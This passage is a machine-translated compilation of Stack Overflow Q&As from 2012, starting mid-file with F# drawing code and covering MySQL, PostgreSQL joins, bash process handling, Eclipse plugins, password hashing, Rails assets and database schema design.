    let private GetRectangleVertices (center:Vector2, size:Vector2, radians:float32, color:Color) = 
        let halfSize = size / 2.0f
        let mutable topLeft = -halfSize
        let mutable bottomRight = halfSize
        let mutable topRight = new Vector2(bottomRight.X, topLeft.Y)
        let mutable bottomLeft = new Vector2(topLeft.X, bottomRight.Y)

        topLeft <- Vector2.Transform(topLeft, Matrix.CreateRotationZ(radians)) + center
        topRight <- Vector2.Transform(topRight, Matrix.CreateRotationZ(radians)) + center
        bottomRight <- Vector2.Transform(bottomRight, Matrix.CreateRotationZ(radians)) + center
        bottomLeft <- Vector2.Transform(bottomLeft, Matrix.CreateRotationZ(radians)) + center

        [|
            new VertexPositionColor(new Vector3(topLeft, 0.0f), color)
            new VertexPositionColor(new Vector3(topRight, 0.0f), color)
            new VertexPositionColor(new Vector3(topRight, 0.0f), color)
            new VertexPositionColor(new Vector3(bottomRight, 0.0f), color)
            new VertexPositionColor(new Vector3(bottomRight, 0.0f), color)
            new VertexPositionColor(new Vector3(bottomLeft, 0.0f), color)
            new VertexPositionColor(new Vector3(bottomLeft, 0.0f), color)
            new VertexPositionColor(new Vector3(topLeft, 0.0f), color)
        |]

    let DrawRectangle (drawingManager:DrawingManager, center:Vector2, size:Vector2, radians:float32, color:Color) = 
        let vertices = GetRectangleVertices(center, size, radians, color)

        for pass in drawingManager.Effect.CurrentTechnique.Passes do
            pass.Apply()
            drawingManager.GraphicsDevice.DrawUserPrimitives(PrimitiveType.LineList, vertices, 0, vertices.Length/2) 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-18T21:30:38.313

这是一个猜测；我对这个域一无所知，但是每次读取该`Effect`属性时都会创建一个新对象；`BasicEffect`也许您想`let`在构造函数中使用 a 初始化该对象一次，然后返回该对象？

# mysql - How does MySQL find rows with a given content?

> ID：11091165
> 
> 赞同：1
> 
> 时间：2012-06-18T21:14:16.767
> 
> 标签：mysql, select

I am wondering how MySQL finds the rows in a table when searching like so:

```
select * from table where field = 'text'; 
```

Does it use a particular search algorithm? Is it practically the fastest way to look up information in a table? Or would building a search macro using another algorithm (like Boyer-Moore) work faster?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:22:39.843

如果字段上有索引，那么数据库通常使用 b-tree 进行索引搜索。如果没有索引，则扫描整个表。本文介绍了 MySql 中使用的一些技术

[http://dev.mysql.com/doc/refman/5.5/en/index-btree-hash.html](http://dev.mysql.com/doc/refman/5.5/en/index-btree-hash.html)

许多小时的工作已经投入到优化 MySql 上。利用已经完成的工作，并拒绝尝试重新做

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:20:25.313

如果您对它如何找到这些记录感兴趣，请尝试使用 EXPLAIN 关键字执行：

```
EXPLAIN select * from table where field = 'text'; 
```

我建议您查看[这篇文章](http://weevilgenius.net/2010/09/mysql-explain-reference/)，以更好地了解后台发生的事情。

如果您能够自己编写更快的东西，我会感到非常惊讶。您可以查看在相关表上创建索引以加快选择速度。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T21:17:56.573

对于该查询，它只能搜索该表的每个条目并将其字段列与该字符串进行比较。

不需要 Boyer-Moore，因为它要求的是完全相等，而不是询问该字段是否包含该字符串。

# javascript - 多个 Facebook 脚本？

> ID：11091170
> 
> 赞同：2
> 
> 时间：2012-06-18T21:14:30.920
> 
> 标签：javascript, facebook, facebook-like

这可能是一个愚蠢的问题，但是like 按钮页面上的 facebook 按钮脚本与 javascript sdk 页面上的脚本不同，但相似。Facebook 只是忘记更新文档还是我需要两个脚本？

喜欢按钮页面给出：

```
<div id="fb-root"></div>
<script> (function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
  }(document, 'script', 'facebook-jssdk'));</script> 
```

但是在 javascript sdk 页面上：

```
<div id="fb-root"></div>
<script>
  window.fbAsyncInit = function() {
  FB.init({
  appId      : 'YOUR_APP_ID', // App ID
  channelUrl : '//WWW.YOUR_DOMAIN.COM/channel.html', // Channel File
  status     : true, // check login status
  cookie     : true, // enable cookies to allow the server to access the session
  xfbml      : true  // parse XFBML
});

// Additional initialization code here
};

// Load the SDK Asynchronously
(function(d){
 var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
 if (d.getElementById(id)) {return;}
 js = d.createElement('script'); js.id = id; js.async = true;
 js.src = "//connect.facebook.net/en_US/all.js";
 ref.parentNode.insertBefore(js, ref);
  }(document));
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T23:07:46.110

我认为这是故意的。

那些将使用 javascript SDK 的人可能想要做的不仅仅是简单地添加一个赞按钮，因此它们包含 fb.init 脚本并向您显示您在哪里添加进一步的初始化代码等。

那些只是添加一个like按钮的人可以粘贴另一个blob，它掩盖了fbinit的东西，以避免与这一行混淆和复杂： `(document, 'script', 'facebook-jssdk'));`

我想如果你两者都尝试，它们都会起作用:)

# php - 使用单个 mysql 查询检查孩子是否是后代

> ID：11091173
> 
> 赞同：1
> 
> 时间：2012-06-18T21:14:35.847
> 
> 标签：php, mysql, sql, tree, multiway-tree

假设我有这张桌子

```
parent | child 
   1       2        
   1       3        
   2       4        
   4       5        
   5       6 
```

我想检查 6 是否是 1 的后代（它是）....我可以在一个查询中完成此操作，还是我必须不可避免地获取所有数据并使用 PHP 处理它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:20:45.740

那是一棵树（如果一个节点可能有多个父节点，则为图）...树的每个节点都只知道是父节点，您不能用单个“跳”向后解析树结构。

或者更好，你可以，但前提是你将从节点到树根的完整路径保存到节点数据库行中，像这样......

```
parent | child | path
   1       3      3,1
   3       2      2,3,1 
```

等等...

您还可以阅读以下内容：[O(1) 算法来确定节点是否是多路树中另一个节点的后代？](https://stackoverflow.com/questions/6020369/o1-algorithm-to-determine-if-node-is-descendant-of-another-node-in-a-multiway)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:26:22.770

在单个查询中执行此操作需要递归语法，而 mysql 不支持。Oracle 使用`with ... connect by prior`和 SqlServer 使用 CTE（通用表表达式）进行递归。

本质上，您将不得不使用 PHP 进行查询和解析，或者使用存储过程创建一个临时表来以编程方式进行递归。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T21:30:55.820

您可以在 MySQL 中使用递归遍历树，而无需在 PHP 中处理数据。MySQL 不支持真正的递归，所以你必须适应一些递归技术：

[这个 SO question 中描述了一种方法](https://stackoverflow.com/questions/4345909/mysql-recursion)，但会涉及更改您的表格。

另一种方法是使用[存储函数](http://dev.mysql.com/doc/refman/5.1/en/stored-routines.html)，它将循环遍历表，直到工作完成（这在某种程度上是递归的）。这可能适用于您当前的表，但实现起来更复杂。

我在这里有一个示例，它遍历 TYPO3 页面表，查找给定根行的所有页面 ID（与您要实现的目标相当）：

```
BEGIN
        DECLARE _id INT;
        DECLARE _parent INT;
        DECLARE _next INT;
        DECLARE CONTINUE HANDLER FOR NOT FOUND SET @id = NULL;

        SET _parent = @id;
        SET _id = -1;

        IF @id IS NULL THEN
                RETURN NULL;
        END IF;

        LOOP
                SELECT  MIN(uid)
                INTO    @id
                FROM    pages
                WHERE   pid = _parent
                AND uid > _id
                AND deleted = 0
                AND hidden =0;                
                IF @id IS NOT NULL OR _parent = @start_with THEN
                        SET @level = @level + 1;
                        RETURN @id;
                END IF;
                SET @level := @level - 1;
                SELECT  uid, pid
                INTO    _id, _parent
                FROM    pages
                WHERE   uid = _parent
                AND     deleted = 0
                AND     hidden = 0;
        END LOOP;
END 
```

对不起，我现在没有时间根据您的需要定制这个例子，这使得这个答案不完整，但我希望这能让您走上正确的轨道。

# bash - 如何在我的 shell 脚本中编写此进程终止逻辑

> ID：11091180
> 
> 赞同：0
> 
> 时间：2012-06-18T21:15:10.123
> 
> 标签：bash, shell

我有这个：

```
#!/bin/sh

handle_exit()
{
    # if func2 called first then do some thing to kill func1 also 
    # if func1 called first then do some thing to kill func2 also 

    exit
}

func1()
{
    for i in `seq 40`
    do
        echo I am in func1 $i
        sleep 3

        if [ "$i" = "20" ] ; then # this could be a failure condition
            handle_exit 
        fi
    done
}

func2()
{
    for i in `seq 40`
    do
        echo I am in func2 $i
        sleep 3

        if [ "$i" = "10" ] ; then # this could be a failure condition
            handle_exit             
        fi
    done
}

func1 &

pidfunc1=$!

func2 &

pidfunc2=$! 
```

我希望它如何表现：

1.  调用 func1 和 func2 作为子进程。（已经这样做了）
2.  如果在运行时发生错误`func1`，则调用`handle_exit`which should`exit` `func1`并**kill func2**。
3.  与 #2 相同，但用于 func2。如果在运行时发生错误`func2`，则调用`handle_exit`which should`exit` `func2`并**同时终止 func1**。

你能帮我吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-18T21:59:52.430

将以下内容放在脚本的开头：

```
pidfunc1=0;
pidfunc2=0;

handle_exit()
{

    if [ "pidfunc1" != "0" ] ; then
            kill -9 $pidfunc1
            echo "killed 1"
    fi
    if [ "pidfunc2" != "0" ] ; then
            kill -9 $pidfunc2
            echo "killed 2"
    fi

} 
```

# java - Eclipse 插件 - 无法解析 Swing 类引用

> ID：11091182
> 
> 赞同：3
> 
> 时间：2012-06-18T21:15:14.367
> 
> 标签：java, eclipse, plugins

（**免责声明**：以下都不正确：（1）Java 是我的强项，（2）我是插件开发方面的专家。）

我的 Eclipse 插件项目包括 5 个插件。其中2个编译得很好。3 不包括对`org.eclipse.swt.widgets`or`org.eclipse.swt.graphics`包中的类的依赖项。（非常烦人的）编译时错误消息是：

```
The type org.eclipse.swt.widgets.Control cannot be resolved. 
It is indirectly referenced from required .class files. 
```

现在，我已经带着一把细齿梳子走过了这个工作区。我已经检查并重新检查了以下内容：

*   类路径。查看！（适当的 JRE 和 JDK 在 Windows PATH 上。）
*   依赖关系。查看！（包括所有库。）
*   构建路径。查看！（使用正确的 JRE，导入所有必要的库，构建顺序是正确的。）
*   进口。查看！（是的。正确的库被导入，如对话框中所示。）
*   清单.MF。查看！（仔细检查清单文件以确保路径正确。所有三个项目都从同一个 JRE 引用同一个文件。）
*   插件.XML。查看！（是的，文件很好。）
*   .ClassPath 文件。查看！（这里也没有问题。类路径文件都很好。）
*   build.properties 文件。查看！（这里也没有惊喜。）

我用谷歌搜索和stackoverflow，直到我的眼睛在流血。典型的建议似乎都没有帮助。

然而，我敢肯定，通常的事实将在这里得到证明。（*在所有条件相同的情况下，答案通常是简单、愚蠢且显而易见的。*）

有人可以建议我还没有看过的东西吗？我非常愿意提供您可能需要的任何信息。

PS 我可能会注意到有太多的地方可以为插件配置依赖项*？*伟大的咕咕咕咕咕咕。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T20:20:10.370

您的目标平台与您环境中可用的 swt 插件之间存在脱节。

*   在 Eclipse 中，转到帮助 -> 首选项 -> 目标平台。
*   选择您的目标平台并单击[编辑...]。
*   在对话框中，选择“环境”选项卡。

“目标环境”中的字段将用于加载您的 swt 插件。未填写的任何字段将默认为当前环境检测到的值。

在您的情况下，您有一个 win32.x86 swt jar。如果您在 64 位 Windows 上运行，并且架构字段为空白，则您的 32 位 swt jar 将不会加载。您有两个选项来解决任何差异：

1.  安装 Eclipse 平台包。它将包含所有平台的所有 swt jar。
2.  使“目标环境”字段与您可用的 swt jar 匹配。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:22:53.790

这基本上意味着它是一个间接的不满足的依赖关系：您正在使用的库中的一个类需要在类路径上存在一些其他类:)

现在我不知道你如何管理你的依赖项（maven 或手动），但作为一个起点，如果你还没有它，你可以使用 jarfinder.com 来查找和下载必要的库： [http://www.jarfinder。 com/index.php/java/info/org.eclipse.swt.widgets.Control](http://www.jarfinder.com/index.php/java/info/org.eclipse.swt.widgets.Control)

如果您使用 Maven，您应该查看日志，因为它会尝试下载所有必要的库，包括依赖项。因此，如果出现任何问题，它应该在日志中指出连接问题或由于其他原因无法下载人工制品。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-07-28T03:39:45.797

1.  打开 Eclipse IDE
2.  选择菜单项目->清理
3.  关闭 Eclipse IDE
4.  从 /home/user/.swt 中删除 .swt
5.  重新打开eclipse并修复消息

# sql - 这里的最佳 JOIN 方法是什么？

> ID：11091187
> 
> 赞同：2
> 
> 时间：2012-06-18T21:15:32.580
> 
> 标签：sql, postgresql, join

这里有两个返回相同结果集的查询，但哪个是最佳语句或无关紧要？

```
SELECT A.id, B.somefield FROM (
   SELECT id from table1
   UNION
   SELECT id from table2
) A LEFT JOIN table3 B on A.id = B.id 
```

或者

```
SELECT A.id, B.somefield FROM table1 A LEFT JOIN table3 B on A.id = B.id
UNION
SELECT A.id, B.somefield FROM table2 B LEFT JOIN table3 B on A.id = B.id 
```

我意识到我可以将它们充满数据并运行一些测试，但我同样对“为什么”感兴趣，如果一个更快？（我正在使用 postgresql，以防它影响事情）。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:31:34.230

首先使用的执行计划`UNION`显示的步骤要少得多，不幸的是，执行计划并不是一切，还有表扫描、逻辑读取、CPU 使用率，所以这不是全部，它在很大程度上取决于您的数据和你的指数。

使用 dupes 时，第一个查询应该执行得更好，因为在`UNION`连接之前删除重复项会导致对表 3 的表扫描次数减少。如果 table1 和 table2 中没有重复项，那么应该没有区别。

这可以通过一些示例数据来证明。我所有的示例都使用以下 5 个表（T4 和 T5 只是将输出转储到其中，因此您不必在 SQL fiddle 页面向下滚动数英里即可查看执行计划）

```
CREATE TABLE T1 (ID INT NOT NULL);
CREATE TABLE T2 (ID INT NOT NULL);
CREATE TABLE T3 (FK INT NOT NULL, SomeValue VARCHAR(10) NOT NULL);
CREATE TABLE T4 (ID INT NOT NULL, SomeValue VARCHAR(10) NULL);
CREATE TABLE T5 (ID INT NOT NULL, SomeValue VARCHAR(10) NULL); 
```

并且全部使用以下内容进行测试（也反向完成以消除任何查询计划缓存）：

```
INSERT INTO T4
SELECT  ID, SomeValue
FROM    T1
        LEFT JOIN T3
            ON ID = FK
UNION 
SELECT  ID, SomeValue
FROM    T2
        LEFT JOIN T3
            ON ID = FK;

INSERT INTO T5
SELECT  ID, SomeValue
FROM    (   SELECT  ID
            FROM    T1
            UNION
            SELECT  ID
            FROM    T2
        ) T
        LEFT JOIN T3
            ON ID = FK; 
```

**示例 1 - T1 包含也在 T2 中的行**

```
INSERT INTO T1 (ID)
SELECT  *
FROM    GENERATE_SERIES(0, 40000);

INSERT INTO T2 (ID)
SELECT  *
FROM    GENERATE_SERIES(20000, 60000);

INSERT INTO T3 (FK, SomeValue)
SELECT  *, 'VALUE'
FROM    GENERATE_SERIES(10000, 50000); 
```

[SQL Fiddle 上的示例](http://www.sqlfiddle.com/#!1/ccb42/1)显示插入到 T4（`UNION`之前`JOIN`）性能更好。我已经运行了 25 次，其中 22 次插入到 T4 运行得更快。没有足够的数据从等式中消除服务器负载，因此正如预期的那样，存在一些异常情况。[在此示例](http://www.sqlfiddle.com/#!1/ccb42/2)中，插入的顺序颠倒了，再次看到了类似的结果。

**示例 2 - table1 和 table2 中没有重复项**

```
INSERT INTO T1 (ID)
SELECT  *
FROM    GENERATE_SERIES(0, 30000);

INSERT INTO T2 (ID)
SELECT  *
FROM    GENERATE_SERIES(30001, 60000);

INSERT INTO T3 (FK, SomeValue)
SELECT  *, 'VALUE'
FROM    GENERATE_SERIES(10000, 50000); 
```

在这个例子中，执行时间更接近彼此，并且经常在哪种方法执行得更快之间切换。

[样本数据](http://www.sqlfiddle.com/#!1/831d4/2)

[样本数据 2](http://www.sqlfiddle.com/#!1/831d4/1)

最后，重申已经提出的观点，如果您不期望被欺骗/不关心被欺骗，那么`UNION ALL`将提高性能，但是由于没有欺骗，两种方法的性能应该大致相似，这应该会改善两种方法在同等程度上。我没有对此进行测试，但更改我用来检查的测试数据应该不是一项艰巨的任务。

**编辑**

我刚刚尝试了 SQL Fiddle 上的查询，它们显示出的差异比在我的本地机器上的差异要大得多，所以用少许盐来处理这些示例并在您自己的服务器上进行测试，创建一个公平的要容易得多测试环境！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T21:59:25.577

OK，首先关闭，`id`在选择列表中是模棱两可的；我们想要`A.id`还是`B.id`？

其次，假设 id 是所有表中的索引字段，去重和连接都是 NlogM 操作，其中 N 是“左侧”的行数，M 是“右侧”的行数。对于 N 中的每一行，必须找到或未找到 M 中的匹配行（连接时，将 M 中找到的行包含在结果中；合并时，排除 M 中找到的行）。这意味着最小化左侧的基数将提供最佳性能。

因此，任一查询的复杂性很大程度上取决于表 1 和表 2 之间有多少共享 ID。在零共性（没有相同的行 ID）和每个表 100 行的情况下，第一个查询将执行一个 100log100 联合，然后一个 200log100 连接，第二个查询将执行两个 100log100 连接，然后是一个 100log100 联合，这将在相同的时间内执行。然而，在 100% 的通用性下（表 1 中的每一行也在 2 中），第一个查询将执行 100log100 联合，然后是 100log100 连接（因为 1 和 2 的 UNION 将等同于表 1），而第二个查询仍将执行两个 100log100 连接和一个 100log100 联合。由于最坏情况相同，但查询 1 的最佳情况是查询 2 的三分之二，所以我选择查询 1。

但是，正如评论者所说，如果您不期望任何欺骗，则 UNION ALL 在两个查询中都会表现得更好。A 和 B 的 UNION ALL 的结果是 A+B，它只受每个集合的访问时间的约束（我没有考虑过）。通过不期望欺骗，两个查询都可以减少到第一个查询的最佳情况下的性能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:18:16.943

用于`EXPLAIN ANALYZE SELECT A.id, ...`每个查询并比较结果。他们可能是一样的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-18T21:20:17.217

为每个查询运行 postgres 的[EXPLAIN](http://www.postgresql.org/docs/9.1/static/sql-explain.html)并查看执行成本。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-19T14:15:42.013

下面的查询生成的查询计划与@GarethD 的两个查询计划不同，但执行大致相同（添加主键后）：

```
-- EXPLAIN ANALYZE
WITH ttt AS (
    SELECT COALESCE(t1.id,t2.id) AS id
        FROM    t1
        FULL OUTER JOIN t2 ON t1.id = t2.id
    )   
INSERT INTO t6 (id, somevalue)
SELECT tx.id AS id
    , t3.somevalue AS somevalue
FROM ttt tx
LEFT JOIN t3 ON tx.id = t3.fk
        ; 
```

注意：在查询计划中 COALESCE() 函数不存在，因此它实际上被视为运算符（这很好）：

```
 QUERY PLAN                                                         
---------------------------------------------------------------------------------------------------------------------------
 Insert on t6  (cost=3761.65..5761.69 rows=40001 width=10) (actual time=1643.429..1643.429 rows=0 loops=1)
   CTE ttt
     ->  Hash Full Join  (cost=1004.80..2488.62 rows=40001 width=8) (actual time=129.768..399.898 rows=60001 loops=1)
           Hash Cond: (t1.id = t2.id)
           ->  Seq Scan on t1  (cost=0.00..557.01 rows=40001 width=4) (actual time=0.008..60.693 rows=40001 loops=1)
           ->  Hash  (cost=533.80..533.80 rows=37680 width=4) (actual time=129.737..129.737 rows=40001 loops=1)
                 Buckets: 4096  Batches: 1  Memory Usage: 938kB
                 ->  Seq Scan on t2  (cost=0.00..533.80 rows=37680 width=4) (actual time=0.016..62.236 rows=40001 loops=1)
   ->  Hash Left Join  (cost=1273.02..3273.06 rows=40001 width=10) (actual time=265.672..999.408 rows=60001 loops=1)
         Hash Cond: (tx.id = t3.fk)
         ->  CTE Scan on ttt tx  (cost=0.00..800.02 rows=40001 width=4) (actual time=129.776..603.317 rows=60001 loops=1)
         ->  Hash  (cost=597.01..597.01 rows=40001 width=10) (actual time=135.854..135.854 rows=40001 loops=1)
               Buckets: 4096  Batches: 2  Memory Usage: 627kB
               ->  Seq Scan on t3  (cost=0.00..597.01 rows=40001 width=10) (actual time=0.009..66.008 rows=40001 loops=1)
 Total runtime: 1644.480 ms 
```

通过更好的调整（更少的 work_mem，强制基于磁盘的执行，以及更低的 random_page_cost 以促进索引使用），计划甚至变得更好：

```
SET work_mem = 64;
SET random_page_cost = 2.1;
SET seq_page_cost = 2;

                                                              QUERY PLAN                                                              
--------------------------------------------------------------------------------------------------------------------------------------
 Insert on t6  (cost=4404.54..6654.58 rows=40001 width=10) (actual time=1573.465..1573.465 rows=0 loops=1)
   CTE ttt
     ->  Merge Full Join  (cost=0.00..2758.52 rows=40001 width=8) (actual time=0.048..348.906 rows=60001 loops=1)
           Merge Cond: (t1.id = t2.id)
           ->  Index Scan using t1_pkey on t1  (cost=0.00..1103.37 rows=40001 width=4) (actual time=0.022..67.840 rows=40001 loops=1)
           ->  Index Scan using t2_pkey on t2  (cost=0.00..1084.15 rows=37680 width=4) (actual time=0.018..68.583 rows=40001 loops=1)
   ->  Hash Left Join  (cost=1646.02..3896.06 rows=40001 width=10) (actual time=170.840..957.899 rows=60001 loops=1)
         Hash Cond: (tx.id = t3.fk)
         ->  CTE Scan on ttt tx  (cost=0.00..800.02 rows=40001 width=4) (actual time=0.055..544.544 rows=60001 loops=1)
         ->  Hash  (cost=794.01..794.01 rows=40001 width=10) (actual time=170.130..170.130 rows=40001 loops=1)
               Buckets: 1024  Batches: 32  Memory Usage: 42kB
               ->  Seq Scan on t3  (cost=0.00..794.01 rows=40001 width=10) (actual time=0.009..79.751 rows=40001 loops=1)
 Total runtime: 1574.108 ms
(13 rows) 
```

# couchbase - 沙发底座澄清

> ID：11091189
> 
> 赞同：0
> 
> 时间：2012-06-18T21:15:41.147
> 
> 标签：couchbase

我在使用 couchbase 时遇到了问题，但这可能是因为我不太了解 couchbase 的工作原理。我创建了一个简单的控制台 .NET 应用程序来执行一些简单的存储和获取数据。我遇到的问题是当我关闭应用程序，然后重新启动它并尝试获取我以前存储的数据时，它不会检索任何数据。但是，如果我在关闭应用程序之前存储然后获取，它会返回数据。谁能给我澄清一下？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:04:22.353

发现我的问题...我没有正确处理客户。我让客户成为另一个班级的成员，这就是我在 using 语句中的内容，所以我想这并没有正确处理。

# php - 将密码转换为哈希 PHP

> ID：11091195
> 
> 赞同：0
> 
> 时间：2012-06-18T21:16:06.693
> 
> 标签：php, database, passwords

我的数据库中的密码现在是文本，我只是想我可以使用`md5()`函数将密码转换为哈希值，但现在我想将数据库中的所有用户都转换为哈希值，所以我不需要这样做告诉每个人重新输入密码，

这个问题与任何其他问题都没有重复，例如[将数据库中的文本密码转换为散列密码？](https://stackoverflow.com/q/3982173/1413871)，因为我想知道如何在 PHP 中做到这一点，并且[PHP 密码的安全哈希和盐](https://stackoverflow.com/q/401656/1413871)也不重复，因为我想更改数据库中已经存在的所有密码我不需要询问我的所有用户如上所述更改他们的密码，

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:21:31.990

对于您的示例，您所要做的就是通过哈希运行每个密码（我建议不要使用 md5，因为它现在已经知道弱点）并将哈希存储回来。然后当有人尝试登录时，获取他们的密码并对其进行哈希处理，然后将哈希值与您在数据库中的内容进行比较。如果您当前存储明文，则不必要求用户租用任何内容，只需散列您已有的内容即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-08-15T07:00:15.777

Md5 加密并不安全，但我已为您加密。

```
password_hash() example using Argon2i

<?php
echo 'Argon2i hash: ' . password_hash('rasmuslerdorf', PASSWORD_ARGON2I);
?> 
```

# c# - 通过序列化更新现有 XML 文件

> ID：11091196
> 
> 赞同：2
> 
> 时间：2012-06-18T21:16:14.503
> 
> 标签：c#, xml, xml-serialization

我正在使用 xml 序列化和反序列化来读取和写入 XML 文件。一切正常，我喜欢它，因为我可以通过我生成的单个对象访问文件中的任何数据。

但是，我必须更新某些元素或将其从我的 xml 文件中删除。通过阅读该站点，我认为我可以使用 Xpath 或 LINQ 来做到这一点，但由于上述原因，我仍然喜欢通过序列化来做到这一点。是否可以？序列化是否意味着做这种逻辑？哦，我不想删除/重新创建我的文件，因为它违背了更新的目的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:42:41.053

在 xml 中更改它可能是不确定的，除非它是集合之一，否则删除一个节点几乎肯定会破坏它，甚至可能会破坏它。你也许可以让它工作，但它会使你的代码非常脆弱，并可能给你留下一些非常困难的错误。

反序列化它。更改属性并再次序列化。

或者不要使用序列化来获取您的 xml。

# ruby-on-rails-3 - 为什么 <%= javascript_include_tag "application" %> 在开发中包含我的所有 JS 文件，但在生产中不包含？

> ID：11091201
> 
> 赞同：1
> 
> 时间：2012-06-18T21:16:30.757
> 
> 标签：ruby-on-rails-3, asset-pipeline

我的`application.js`文件如下所示：

```
//= require jquery
//= require jquery_ujs
//= require rails.validations
//= require_tree . 
```

我的开发站点在源代码中有这个：

```
<script src="/assets/jquery.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery_ujs.js?body=1" type="text/javascript"></script>
<script src="/assets/rails.validations.js?body=1" type="text/javascript"></script>
<script src="/assets/home.js?body=1" type="text/javascript"></script>
<script src="/assets/industries.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery-1.7.1.min.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.ba-hashchange-v1.3.min.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.flexslider-v1.8.min.js?body=1" type="text/javascript"></script>
<script src="/assets/main-r6.js?body=1" type="text/javascript"></script>
<script src="/assets/welcome.js?body=1" type="text/javascript"></script>
<script src="/assets/application.js?body=1" type="text/javascript"></script> 
```

但我的作品是这样的：

```
<script src="/assets/application-b5f7c629f9622da89d5cc703e459e6c3.js" type="text/javascript"></script> 
```

我的`config/environments/development.rb`有这个：

```
config.assets.compress = false 
```

我的`config/environments/production.rb`有这个：

```
 config.serve_static_assets = false    
  config.assets.compress = true    
  config.assets.compile = true
  config.assets.digest = true 
```

想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:47:29.160

两种环境都包括所有的 javascript。默认情况下，在生产模式下，rails 资产管道组合/缩小您的 javascript（和 css），这减少了浏览器/客户端需要向服务器发出的请求数量。

rails 指南中有对资产管道的详细解释：

[http://guides.rubyonrails.org/asset_pipeline.html](http://guides.rubyonrails.org/asset_pipeline.html)

# sql - 设计：每位患者多次就诊

> ID：11091202
> 
> 赞同：1
> 
> 时间：2012-06-18T21:16:32.977
> 
> 标签：sql, sql-server, database, sql-server-2008, database-design

![在此处输入图像描述](../Images/61f8639de3bde45b2af730b7d80243e0.png)

以上是我的架构。您在 tblPatientVisits 中看不到的是来自 的外键`tblPatient`，即`patientid`.

`tblPatient`包含数据集中每个患者的不同副本以及他们的性别。 `tblPatientVists`包含他们的人口统计信息，他们在入院时住在哪里以及他们去了哪家医院。我选择将这些信息放入一个单独的表中，因为它在整个数据中都会发生变化（一个人可以从一次访问转移到下一次访问并转到另一家医院）。

在我添加 tblPatientVisits 之前，我的查询没有收到任何奇怪的数字。中只有不到一百万的索赔`tblClaims`，但是当我添加`tblPatientVisits`以便我可以查看那个人来自哪里时，它返回了超过一百万。我认为这是因为在`tblPatientVisits`同一个患者 ID 中出现了不止一次（因为他们有不同的入院/出院日期）。

在我的一生中，我看不出这是不正确的设计，我也不知道如何纠正它，除了使用`count(tblPatientVisits.PatientID=1`然后`union`使用`count(tblPatientVisits.patientid)>1`.

对这种类型的设计有任何见解，或者我如何更优雅地找到一种方法来获取 claimType`tblClaims`以给我正确的行数，并将索赔 ID 与患者 ID 相关联？

编辑：我遇到的最大问题是，如果我在 tblPatient 表中包含`admissionDate,dischargeDate`or ，`patientState`我就不能使用 patientID 作为主键。

需要注意的是，`tblClaims`都`NOT`必然相关`tblPatientVisits.admissionDate, tblPatientVisits.dischargeDate`。

编辑：示例查询显示当添加 tblPatientVisits 时，返回的行多于声明

```
SELECT     tblclaims.id, tblClaims.claimType
FROM         tblClaims INNER JOIN
                      tblPatientClaims ON tblClaims.id = tblPatientClaims.id INNER JOIN
                      tblPatient ON tblPatientClaims.patientid = tblPatient.patientID INNER JOIN
                      tblPatientVisits ON tblPatient.patientID = tblPatientVisits.patientID 
```

返回超过一百万的查询行

```
SELECT     tblClaims.id, tblPatient.patientID
FROM         tblClaims INNER JOIN
                      tblPatientClaims ON tblClaims.id = tblPatientClaims.id INNER JOIN
                      tblPatient ON tblPatientClaims.patientid = tblPatient.patientID 
```

返回的查询行数少于一百万

![样本行](../Images/6ad9c05d771e3f4c34e4fc55470a28c7.png)

![超过一百万行](../Images/69a113bbb75b4c1fb69b4a79aff90c13.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:46:16.810

我认为这是在为更好的设计而哭泣。我真的认为访问应该与索赔相关联，并且索赔只能与单个患者相关联，所以我认为设计应该是（并消除不必要的`tbl`前缀，这只是混乱）：

```
CREATE TABLE dbo.Patients
(
  PatientID INT PRIMARY KEY
  -- , ... other columns ...
);

CREATE TABLE dbo.Claims
(
  ClaimID INT PRIMARY KEY,
  PatientID INT NOT NULL FOREIGN KEY
    REFERENCES dbo.Patients(PatientID)
  -- , ... other columns ...
);

CREATE TABLE dbo.PatientVisits
(
  PatientID INT NOT NULL FOREIGN KEY
    REFERENCES dbo.Patients(PatientID),
  ClaimID INT NULL FOREIGN KEY 
    REFERENCES dbo.Claims(ClaimID),
  VisitDate DATE
  , -- ... other columns ...
  , PRIMARY KEY (PatientID, ClaimID, VisitDate) -- not convinced on this one
); 
```

这里有一些冗余信息，但从您的模型中不清楚患者是否可以进行与特定索赔无关的访问，*甚至*您是否知道访问属于特定索赔（这似乎是给出的关键信息您要查询的查询类型）。

无论如何，鉴于您当前的模型，您可能会尝试的一个查询是：

```
SELECT c.id, c.claimType
FROM dbo.tblClaims AS c
